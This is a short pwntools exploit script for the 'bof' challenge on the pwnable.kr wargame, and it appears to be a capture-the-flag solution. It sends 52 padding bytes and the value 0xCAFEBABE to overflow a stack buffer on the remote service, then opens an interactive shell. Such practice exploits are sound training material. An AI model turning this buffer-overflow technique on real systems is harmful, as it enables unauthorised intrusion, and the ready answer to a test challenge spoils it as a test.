#filename:exp.py
#author:reshahar
from pwn import *

#p = process('./bof')
p = remote('pwnable.kr',9000)

sh = 'A'*52+p32(0xCAFEBABE)


p.send(sh)

p.interactive()
